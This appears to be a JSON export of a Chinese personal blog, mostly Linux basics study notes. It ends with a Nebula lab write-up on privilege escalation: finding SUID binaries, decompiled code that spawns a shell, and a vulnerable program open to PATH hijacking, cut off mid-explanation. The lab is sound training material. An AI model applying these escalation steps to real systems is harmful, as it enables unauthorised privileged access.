{"meta":{"title":"daiker's wiki","subtitle":null,"description":null,"author":"daiker","url":"http://www.daikersec.com"},"pages":[{"title":"","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"404.html","permalink":"http://www.daikersec.com/404.html","excerpt":"","text":"哎呀~您的页面不存在！您看是返回首页还是返回首页？ BODY { PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; FONT: 14px/1.6 Arial, Sans-serif; PADDING-TOP: 0px } A:link { COLOR: #ea1921; TEXT-DECORATION: none } A:visited { COLOR: #ea1921; TEXT-DECORATION: none } H1 { Z-INDEX: 2; POSITION: relative; PADDING-BOTTOM: 0px; MARGIN: 140px auto 15px; PADDING-LEFT: 0px; WIDTH: 600px; PADDING-RIGHT: 0px; OVERFLOW: hidden; PADDING-TOP: 0px; xxxxborder: 1px solid } H2 { POSITION: absolute; TEXT-INDENT: -999px; MARGIN: 0px; FONT-SIZE: 0px; TOP: 0px; CURSOR: default; LEFT: 0px; -moz-user-select: none; -webkit-user-select: none; user-select: none } H2 EM { LINE-HEIGHT: 120px; FONT-STYLE: italic; TEXT-INDENT: 0px; DISPLAY: block; FONT-FAMILY: \"Times New Roman\", Times, Serif; LETTER-SPACING: -5px; COLOR: #ffdfdf; FONT-SIZE: 200px; FONT-WEIGHT: bold } .link A { MARGIN-RIGHT: 1em } .link { MARGIN: 0px auto 15px; WIDTH: 600px; COLOR: #505050 } .texts { MARGIN: 0px auto 15px; WIDTH: 600px; COLOR: #505050 } .texts { LINE-HEIGHT: 2 } .texts DD { PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 15px; PADDING-RIGHT: 0px; PADDING-TOP: 0px } .texts UL { PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px } .portal { TEXT-ALIGN: center; WHITE-SPACE: nowrap; COLOR: #505050; WORD-SPACING: 0.45em } .portal A:link { COLOR: #505050; WORD-SPACING: 0px } .portal A:visited { COLOR: #505050; WORD-SPACING: 0px } .portal A:hover { COLOR: #db1a22 } .portal A:active { COLOR: #db1a22 } .portal SPAN { LINE-HEIGHT: 35px; DISPLAY: inline-block; HEIGHT: 38px } .portal SPAN SPAN { PADDING-BOTTOM: 0px; PADDING-LEFT: 20px; PADDING-RIGHT: 0px; PADDING-TOP: 0px } .portal SPAN SPAN SPAN { PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 20px; BACKGROUND-POSITION: 100% -80px; PADDING-TOP: 0px } var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-11293844-1']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })(); 哎哟～404了～休息一下，玩玩这个游戏！ 抱歉, 您所查找的页面不存在, 可能已被删除或您输错了网址! 抱歉, 您所查找的页面不存在, 可能已被删除或您输错了网址! &#9666;返回首页 &#9666;返回上一页 休息一下，玩玩这个游戏。 游戏玩法：将猫困在一个深色原点围成的圈子里面就算成功了。"},{"title":"","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"baidu_verify_t3hw8bdjst.html","permalink":"http://www.daikersec.com/baidu_verify_t3hw8bdjst.html","excerpt":"","text":"t3hw8bdjst"},{"title":"","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"google4f3d2a0004eb46fb.html","permalink":"http://www.daikersec.com/google4f3d2a0004eb46fb.html","excerpt":"","text":"google-site-verification: google4f3d2a0004eb46fb.html"},{"title":"About","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"about/index.html","permalink":"http://www.daikersec.com/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"categories/index.html","permalink":"http://www.daikersec.com/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"tags/index.html","permalink":"http://www.daikersec.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"调度任务","slug":"调度任务","date":"2018-06-24T14:12:06.000Z","updated":"2018-06-24T14:23:07.060Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1.crontab的配置调度任务:让计算机在指定的时间自动运行命令Linux实现调度任务机制的方法是cron和at系统cron是一个调度进程的系统，由一个守护进程 （crond）和用户的配置文件（crontab）构成cron的常见用途是记录系统状态日志、启动备 份、轮换日志文件和开始运行系统清理脚本cron可以被配置为运行或拒绝特定用户的调度事件 能力。通过/etc/cron.allow和/etc/cron.deny文件 实现。cron维护着一个缓冲池（spool）目录来保持 crontab文件。通常这个目录为/var/spool/cron，每 个调度工作的用户在里面都有一个crontab文件。这 个crontab的文件名和用户名一样。如mike用户的crontab文件为/var/spool/cron/mike 接下来的是重点立体以下crontab事件条目分别代表什么时间执行？1）30 23 * * * /bin/sync2） 5 */6 15 1 /bin/sync3）\\/5 0,12 1-5 /bin/sync答：首先前面有五个数字，分别代表 分钟 小时 日期 月 周，最后一个是命令然后*代表都可以，*/5代表5的倍数比如第一个30 23代表在23:30 * * * 代表都可以。那就是在每天的23:30执行/bin/sync.以此类推 1）表示每天的23点30分执行 2）表示每个星期一或每个月15号的0点零5分、6点零5分、 12点零5分、18点零5分执行3）表示星期一到星期五的0点至1点之间每隔5分钟执行和12 点－13点之间每隔5分钟执行","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"权限管理","slug":"权限管理","date":"2018-06-24T14:11:39.000Z","updated":"2018-06-24T14:21:49.011Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1.文件和目录的访问控制第一位属性： 为 d 表示是目录； 为 - 表示是文件； 为 l 表示是连接文件； 为 b 表示是可供存储的设备； 为 c 表示是其他外围设备，如键盘、鼠标等。 其他9位属性称为保护标志（权限字），每3位为一组，即 对三类用户（用户、组和其他）提供保护要存取一个文件或目录，对于每一个用户，都必须提供相 应的权限 2.粘滞位先看这个对于其他用户的权限是rwt,随后是t不是x。这个就是粘滞位。其他用户对他都rw权限，正常有删除的权限，但是有了粘滞位之后。不能删除 当目录被设置了粘滞位权限以后，即便用户对该目录有写的权限，也不能删除该目录中其他用户的文件数据，而是只有该文件的所有者和root用户才有权将其删除。设置了粘滞位之后，正好可以保持这种动态的平衡：允许各用户在目录中任意写入、删除数据，但是禁止随意删除其他用户的数据。 但是该目录下的目录不继承该粘滞位权限，要再设置才可使用。也只能针对目录设置，对于文件无效。则设置了粘滞位后，只有目录内文件的所有者或者root才可以删除或移动该文件。如果不为目录设置粘滞位，任何具有该目录写和执行权限的用户都可以删除和移动其中的文件。 需要注意的是：粘滞位权限只能针对目录设置，对于文件无效。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"进程管理","slug":"进程管理","date":"2018-06-24T14:11:26.000Z","updated":"2018-06-24T14:23:38.039Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"代码段、数据段和PCB（进程控制块)同一 个进程下可以拥有多个线程，它们共享这个进程的资源， 它们之间的切换也不再需要PCB，而只需要极少一点资 源就可以了。在这样的操作系统里，线程变成了系统调 度和分派的基本单位。 1. PID 每一个进程都有唯一的ID（PID），是在进程表中识别 进程的标识第一栏就是pid 2. PPID这个进程的父进程父进程跟子进程:Linux下，进程的创建，采用的是Fork（派生）：用一个程序创建一个新进程的方法 。比如我创建一个进程ping，必须通过另外的一个进程来派生，另外的进程就叫做父进程。比如ping在控制台下运行，是bash派生的fork-exec：先用fork生成一个子进程,然后利用 exec函数族用新进程映像取代调用进程映像。 这时候shell将等待fork-exec子进程执行完毕，并 重新显示shell提示信息。 3. EUID（effective user id）uid和euid（effective user id）的区别：uid就是你 login的时候使用的id，而euid则是你当前的有效id。比如在setuid的程序里面去执行的时候会暂时性将euid变成文件所有者的sid,但是sid 没变 5. 监视进程ps 命令以短横（-）开始，与System-V兼容。 n 没有短横，与BSD兼容 -e （-A）：显示所有进程 -f ：全格式 n -H （f）：显示树状结构，表示程序间的相互关系。a ：显示现行终端机下的所有程序，包括其他用户的程序。u ：以用户为主的格式来显示程序状况。x ：显示所有程序，不以终端机来区分。所以一般就ps -ef或者 ps aux PID USER PRI NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND PRI：进程优先权方案。较大的数表示较低的优先权NI：该进程的优先级值(niceness )SIZE：该进程的代码大小加上数据大小再加上堆栈空 间大小的总数。单位是KBRSS：进程占用的物理内存的总量SHARE：该进程使用共享内存的数量STAT：进程的状态有这几种 R：是正在CPU中运行的进程，或者是准备就绪，只等 CPU空闲即可运行的进程。 S：休眠的进程是那些等待某些事件触发以继续执行的进 程。通常它会等待某类I/O操作或某个信号。 T：已终止的进程是被用户中断的进程。 D：该进程不能被中断，因为此时内核程序正忙 于该进程的某些I/O操作TIME：该进程自启动以来所占用的总CPU时间 6. 管理进程 内核程序利用优先级大小来判断何时及如何安排进程。每个进程都有两个优先级值：静态值和动态值。我们通常讨论的优先级是指静态优先级，因为我们无法 控制动态优先级。优先级值的范围从-20到20（实际上为19）。大部分优 先级的值为0优先级值小的进程具有更高的优先级。即减少niceness 值（优先级值）就意味着进程能获得更多的CPU时间。子进程会继承父进程的优先级。nice 更改优先级(直接 – niceness )nice -19 tar(19是 niceness)把这个tar 命令执行后的优先级调到最低 renice改变运行中进程的优先级renice 19 50(19为niceness,50为pid)第二个参数是niceness，第三个参数是pid 查看后台程序jobs将后台程序放到前台bg %id将进程放到后台 刚要执行的时候直接在后面加&amp;如python run.pu &amp; 将正在执行的程序放到后台,ctrl+z,这个时候是挂起在后台的，通过bg %id是它在后台运行 7. 信号发送的命令killkill [option] pid… -l：列出所有可用信号名称-s signal / -signal ：指定发送特定的信号kill -s 9 471强制杀死pid为471的进程可缩写为kill -9 471","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"用户管理","slug":"用户管理","date":"2018-06-24T14:11:09.000Z","updated":"2018-06-24T14:22:48.361Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1. 用户介绍新用户在Linux系统内要有一个帐号和工作环境用户的信息存储在/etc/passwd里面以下面这条为例子12root:x:0:0:root:/root:/bin/bash用户名:密码:uid:gid:注释信息:家目录:shell 第一个是用户名root，是用户用于登录Linux系统使用的名字，该名 字在同一系统上必须唯第二个 x是用户密码，在旧版本的系统是放在这边的，但是新版本放在/etc/shadow里面了。第三个是0，是用户的UID第四个是0，是以用户的GID第五个是注释信息第六个是用户的家目录第七个是用户的默认shell。这里面需要注意是一个shell。/sbin/nologin这个shell 不允许用户登陆。 2. 新增用户useradd [选项…] 用户名(选项分别对应上面的/etc/passwd的内容) -u uid 用户的UID值 。数字不可为负值。-g defaultgroup 指定该用户登录使用的群组。-c comment 该用户的注释说明。-d home_dir 指定用户的家目录。-m 用户家目录不在则自动创建。-k skel_dir 指定用户模板目录，默认是/etc/skel。-s shell 指定用户使用的shell。 3. 用户口令 用户口令介绍就是用户登陆所需要的密码，一般放在/etc/shadow文件里面root:$6$mD3zZc/j$ttZCrtCCYIFTGIY3nsEQqTkbBw./FvWFaMK/OxteTaAR.b33J9izn7q2SvsPauDijhYLaaO.SCnr0vBDA5DYy.:17701:0:99999:7:::其中的$6$mD3zZc/j$ttZCrtCCYIFTGIY3nsEQqTkbBw./FvWFaMK/OxteTaAR.b33J9izn7q2SvsPauDijhYLaaO.SCnr0vBDA5DYy.就是加密过的口令。系统会对用户输入的密码加密之后跟这个进行比较。 修改用户口令passwd 用户名 4. 修改用户属性usermod [选项…] 用户名选项跟(useradd)的选项一样 -u uid 用户的UID值 。数字不可为负值。-g defaultgroup 指定该用户登录使用的群组。-c comment 该用户的注释说明。-d home_dir 指定用户的家目录。-m 用户家目录不在则自动创建。 5. 删除用户userdel [-r] 用户名 选项-r可以用于清除用户的家目录。 6.用户组介绍不同的用户可以在同一个组，同一个组成员可以共享一个文件的权限在前面说过/etc/passwd里面有一个属性是gid来表示这个用户属于那个组,这个gid就是组的表示。可以通过查看/etc/group来查看组消息root:x:0:root,test,这里面第一个是组名，第二个是这个组加密过的口令，跟/etc/passwd一样，一般组口令不在这里面，所以他缺省为x,一般组口令在 /etc/gshadow第三个是gid第四个是组成员，用,隔开 7. 增加组groupadd [选项] 组名 -g gid：指定增加组的gid 8. 删除组groupdel 组名 9.修改组用户gpasswd [选项] 组 -a user：添加一个用户到指定组中-d user：从指定组中删除一个用户 10. 修改组的GID和组名groupmod [选项] 组名-g gid：修改指定组的GID-n group_name：修改指定组的组名","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"shell和shell编程","slug":"shell和shell编程","date":"2018-06-24T14:10:56.000Z","updated":"2018-06-24T14:22:14.936Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1. shell变量赋值 任何字符串都可以作为变量的值赋给某个变量； 如果字符串中包含空格、tab或换行符时，应该用 引号（单、双都可以）括起来。 变量的值中包含多个连续的空格在输出显示时会当 作一个空格来处理 1root@DESKTOP-4E87I7L:/tmp# a=5 2. 变量引用$+变量名12root@DESKTOP-4E87I7L:/tmp# echo $a5 3. 系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别） PATH 是操作系统用于查找来自命令行或终端窗口的必需可执行文件的系统变量。比如执行cat 1.txt。这个cat 是在/usr/bin/cat这个路径，但是当前可以找到它，是因为PATH这个变量里面有/usr/bin这个 HOME 家目录正常的话,root用户的家目录在 /root,其他用户在/home/用户名 PS1提示符如 12root@DESKTOP-4E87I7L:/tmp# echo $PS1\\[\\e]0;\\u@\\h: \\w\\a\\]$&#123;debian_chroot:+($debian_chroot)&#125;\\u@\\h:\\w\\$ 其中一些特殊字符的代码\\$ 显示$符作为提示符，如果用户是root的话，则 显示#号。\\\\ 显示反斜杠。\\d 显示当前日期。\\h 显示主机名。\\t 显示当前时间。\\w 显示当前工作目录的路径。 PS2PS2 变量展开的方式与 PS1 相同，其展开值用作次提示符字符串。用于提示接续你尚未完成输入的命令。默认为&gt;比如稍作修改。 PWD当前路径,作用跟pwd一样 环境文件（profile和bashrc的差别）profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及 每次打开新的shell时,该文件被读取. 4. shell通配符用来匹配多个文件名或目录名的特殊字符叫通配 符。* 匹配任意个（含0个）字符? 匹配任意一个字符[list] 匹配其中之一的字符[!list] 匹配不在其中的字符 如1*3.txt匹配1223.txt如1?3.txt匹配123.txt如[abcd]1.txt匹配a1.txt如[a-d]1.txt匹配a1.txt如[!abc]1.txt匹配d1.txt 5. 引号双引号会解析 6. 正则表达式跟通配符的区别正则表达式和shell的特殊字符异同点正则表达用点匹配任意一个字符，相当于shell的问号。.*匹配零或多个字符，相当于shell的* []用法和shell一样，只是用^代替了!表示不匹配 7. 输入输出命令标准输入输出每一个Linux命令都有３个与之相关的输入输出流： stdin 标准输入，命令默认的输入位置 stdout 标准输出，命令默认的输出位置 stderr 标准错误输出，也是命令的输出位置，用于输出错误及诊断信息。重定向比如把应该输出到屏幕的输出到文件 2&gt;&amp;1解释2 是标准错误，1是标准输出，就是把标准错误发送到标准输出。注意1要加个&amp;，不然就会重定向到文件1 cat 1.txt &gt;/dev/null解析这里的/dev/null是黑洞。把输出的重定向到黑洞。等同于不输出 8. 管道命令A | 命令B这个就是管道，把命令A 的内容的标准输出流当成命令B的标准输入流， 举个例子cat 1的结果123传递给grep 2 9. shell脚本变量读取判断循环$# 参数个数$0 文件名$1 第一个参数 1234567891011121314151617181920212223#! /bin/shread -p &quot;please input yes or not: &quot; ynecho $ynif [ &quot;$&#123;yn&#125;&quot;==&quot;Y&quot; -o &quot;$&#123;yn&#125;&quot;==&quot;y&quot; ]; then echo &quot;OK, continue&quot; exit 0elif [ &quot;$&#123;yn&#125;&quot;==&quot;Y&quot; -o &quot;$&#123;yn&#125;&quot;==&quot;y&quot; ]; then echo &quot;oh,NO&quot; exit 0else echo &quot;please input yes or not&quot;fiif [ $# == 1 ]: echo &quot;请添加参数&quot; exit 0fiecho &quot;Filename: &quot;$0i=0while [ &quot;$&#123;i&#125;&quot; != $1 ]do i=$(($i+1)) echo $idone","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"软件管理","slug":"软件管理","date":"2018-06-24T14:10:43.000Z","updated":"2018-06-24T14:23:30.290Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1.RPM的安装、卸载、升级、查询、验证安装rpm -i如rpm -i ftp://ftp.redhat.com/pub/RPMS/zip2.2-1.i386.rpm卸载 rpm -e升级 rpm -U查询 rpm -q验证 rpm -V","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"GUI和文本编辑","slug":"GUI和文本编辑","date":"2018-06-24T14:10:28.000Z","updated":"2018-06-24T14:22:00.471Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1. 远程X的设置X Window系统是一个网络化的视窗系统，它能 够在位映象的屏幕上显示窗口式的文本和图形。X Window系统还可以叫做X11或者X使用X 的两种启动方式：1 先进入命令行界面，然后运行：startx2 开机自动进入图形界面：在/etc/inittab中配置运行 级别为5 在X应用程序后面加上-display和显示的名字如：xeyes -display 192.168.0.3:0表示xeyes在192.168.0.3的显示0上显示 远程的X安全性 基于主机的访问控制 xhost + 允许任何人访问 xhost - 限制访问 在限制访问下为某个主机打开访问控制，使用 xhost +主机名（或IP） 去除某个主机的连接，使用 xhost -主机名（或IP）s 2.vi（教案第3章P21中红色标注的命令）","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"安装和启动","slug":"安装和启动","date":"2018-06-24T14:10:21.000Z","updated":"2018-06-24T14:22:30.320Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1. 文本安装模式进入到shell的方式alt+F2 2. 硬盘及分区代号Master就是主盘的意思，Slave就是从盘的意思除了这个还有promary分区(主分区)和Logical 分区(逻辑分区) 一个硬盘最多有4个主分区。那以第一个从 扩展分区分出来的逻辑分区为/dev/hda5看下面这个例题 3. 分区划分原则 4. inittab文件的作用（关键字不用记）level 5. 系统初始化流程","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"基础","slug":"基础","date":"2018-06-24T14:09:50.000Z","updated":"2018-06-24T14:30:19.942Z","comments":true,"path":"wiki/20dbfd00.html","link":"","permalink":"http://www.daikersec.com/wiki/20dbfd00.html","excerpt":"","text":"1. shell的版本Linux 结构内核:运行程序和 管理像磁盘和打印机等硬件设备的核心程序,要设计得尽可能的 小。Shell:Shell是系统的用户界面，提供了用户与内核进 行交互操作的一种接口。它接收用户输入的命 令并把它送入内核去执行。版本：Bourne Shell：是贝尔实验室开发的。 (sh)oBASH：是GNU的Bourne Again Shell，是GNU 操作系统上默认的shell。oKorn Shell：是对Bourne Shell的发展，在大部分 内容上与Bourne Shell兼容。oC Shell：是SUN公司Shell的BSD版本 2.虚拟控制台的切换（alt＋F1～F6可切换） 3. 文件命名规则(跟变量名挺像的)1 字母数字下划线3 不规定扩展名4 习惯上用类似扩展名的方式来表示文件系统，如prog.c为C源程序5 以.开头的文件名为隐藏文件 比如1.txt,abc.txt,1_1.txt, 4. 绝对路径和相对路径绝对路径:从根开始的路径，比如/home相对路径:从当前目录开始的路径,比如dir/ 5. 硬连接和软连接（符号连接） 硬连接：ln file targetfile o 不用任何参数； 源文件与目标文件须在同一文件系统 只能用于文件连接 源文件和目标文件都引用同一个inode（索引节 点）和盘上相同的数据（文件内容）。 符号连接：ln –s file target 目标文件指向源文件的路径和名字而不是它的数据。 符号连接对所有命令是透明的（除ls和rm） 目标文件指向一个新的inode，不同于源文件的 inode####6.UID和GID每个用户都有一个UID（User ID）和GID（Group ID），可通过/etc/passwd修改UID和GID用id命令查看当前的用户和组的值文件权限的确认是通过识别当前用户的UID或GID进行 的。而和用户的名字或组的名字无关####7. 文件属性、修改文件权限第一位属性： 为 d 表示是目录； 为 - 表示是文件； 为 l 表示是连接文件； 为 b 表示是可供存储的设备； 为 c 表示是其他外围设备，如键盘、鼠标等。 其他9位属性称为保护标志（权限字），每3位为一组，即 对三类用户（用户、组和其他）提供保护要存取一个文件或目录，对于每一个用户，都必须提供相 应的权限 8. 备份和压缩工具tar 命令 -c：创建一个档案 n -x：从档案中解开文件 -v：详细显示过程（verbose） -f：指定操作的tar文件名 -t：浏览档案的内容 -z：用gzip进行压缩 -Z：用compress进行压缩 -j：用bzip2进行压缩 -N/–newer ‘date’：备份指定日期以后变化 的文件 常用压缩命令tar zcvf haha.gz haha要解压就吧c变成xtar zxvf haha.gz 如果是bzip2的格式，，就把z变成jtar jcvf haha.bz2 haha","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"简介","slug":"简介","date":"2018-06-24T14:09:17.000Z","updated":"2018-06-24T14:31:58.054Z","comments":true,"path":"wiki/undefined.html","link":"","permalink":"http://www.daikersec.com/wiki/undefined.html","excerpt":"","text":"1. 一个Linux操作系统包含了Linux内核、标准 GNU（由自由软件基金会组织的）实用工具和 开放源代码应用程序2. 自由软件自由软件不等于开源软件如果一个软件是自由软件，那么它必须为用户提供以下四项基本自由： 自由度0：无论用户出于何种目的，必须可以按照用户意愿，自由地运行该软件。 自由度1：用户可以自由地学习并修改该软件，以此来帮助用户完成用户自己的计算。作为前提，用户必须可以访问到该软件的源代码。 自由度2：用户可以自由地分发该软件的拷贝，这样就可以助人。 自由度3：用户可以自由地分发该软件修改后的拷贝。借此，用户可以把改进后的软件分享给整个社区令他人也从中受益。作为前提，用户必须可以访问到该软件的源代码。####3. GPL规则如果你使用并且修改了我的GPL软件，那么你的软件也必须要开源，否则就不能使用我的软件，你是否把你的软件商用和我没关系。出售自由软件的组织一定要遵循一定的GPL规则：1）不能限制购买软件的用户自由权；2）必须告诉 用户软件属于GPL范畴；3）必须提供软件完整的 源代码。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"Linux简易入门绪","slug":"Linux简易入门绪","date":"2018-06-24T14:09:05.000Z","updated":"2018-06-24T14:29:18.823Z","comments":true,"path":"wiki/fb27c52e.html","link":"","permalink":"http://www.daikersec.com/wiki/fb27c52e.html","excerpt":"","text":"0x00 说明0x01 内容要点1、自由软件、GPL规则2、shell的版本、虚拟控制台的切换、文件命名规则、绝对路径和相对路径3、硬连接和软连接（符号连接）、UID和GID、文件属性、修改文件权限、备份和压缩工具4、vi（教案第3章P21中红色标注的命令）5、文本安装模式进入到shell的方式、硬盘及分区代号、分区划分原则6、inittab文件的作用（关键字不用记）、系统初始化流程、启动脚本程序的设置7、远程X的设置8、shell变量赋值、变量引用、系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）、shell通配符、引号、正则表达式、输入输出命令、管道、shell脚本9、RPM的安装、卸载、升级、查询、验证10、用户管理11、PID、PPID、EUID、EGID，监视进程、管理进程、信号发送的命令kill12、文件和目录的访问控制、粘滞位13、crontab的配置 0x02 目录 0 Linux 简介 1 Linux 基础 2 Linux 安装和启动 3 Linux GUI和文本编辑 4 Linux 软件管理 5 Linux shell和shell编程 6 Linux 用户管理 7 Linux 进程管理 8 Linux 权限管理 9 Linux 调度任务","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"基础学习","slug":"Linux/基础学习","permalink":"http://www.daikersec.com/categories/Linux/基础学习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"}]},{"title":"利用Nebula学习Linux提权","slug":"利用Nebula学习Linux提权","date":"2018-06-04T09:00:24.000Z","updated":"2018-06-20T06:18:46.567Z","comments":true,"path":"wiki/5c949747.html","link":"","permalink":"http://www.daikersec.com/wiki/5c949747.html","excerpt":"0x00 Nebula介绍和玩法Nebula 是# Exploit Exercises 上的基础关他涉及了基本的源码级漏洞分析、提权。可以通过官网下载镜像进行安装。每一关都对应系统中以level开头的账号，密码与账号名相同（比如Level01,对应的系统帐号是level01），每玩一关，都需要用对应的账号登录系统，然后进入到/home/flag×目录中，与该level相关的代码、数据等都放在于此。之后通过运行getflag 来验证是否提权成功 0x01 level00 This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories. 查找suid的程序，直接通过find查找","text":"0x00 Nebula介绍和玩法Nebula 是# Exploit Exercises 上的基础关他涉及了基本的源码级漏洞分析、提权。可以通过官网下载镜像进行安装。每一关都对应系统中以level开头的账号，密码与账号名相同（比如Level01,对应的系统帐号是level01），每玩一关，都需要用对应的账号登录系统，然后进入到/home/flag×目录中，与该level相关的代码、数据等都放在于此。之后通过运行getflag 来验证是否提权成功 0x01 level00 This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories. 查找suid的程序，直接通过find查找 1find / -perm -u=s -type f 2&gt;/dev/null 看到比较奇怪的一个文件/bin/.../flag00提权成功是flag00不是level00了。这里利用的是suid 提权。研究下原理先看flag00的权限有setUidsetUid的功能是12341、SUID权限仅对二进制程序有效。2、执行者对于该程序需要具有x的可执行权限。3、本权限仅在执行该程序的过程中有效。4、执行者将具有该程序拥有者的权限。 再用IDA查看下flag0012345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; __gid_t v3; // ST18_4 __uid_t v4; // ST1C_4 v3 = getegid(); v4 = geteuid(); setresgid(v3, v3, v3); setresuid(v4, v4, v4); puts(\"Congrats, now run getflag to get your flag!\"); return execve(\"/bin/sh\", (char *const *)argv, (char *const *)envp);&#125; 所以大体的原理就是flag00属于flag00这个用户,在level00这个组。在level00这个用户也在level00这个组里面，这里拥有执行权限,而程序又有suid，因此level00在运行这个程序的时候暂时性拥有这个flag00的权限，接下来执行一个shell，并且这个shell传进的环境继承刚刚的环境,因此shell运行的时候的权限还是属于flag00的 0x02 level01 There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01. 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp)&#123; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(\"/usr/bin/env echo and now what?\");&#125; 这个文件也有suid,关键在最后一句，我们能不能让最后一句执行shell。这里面/usr/bin/env后面跟着的是环境变量中的可执行程序，正常这一句，应该要在环境变量中寻找echo 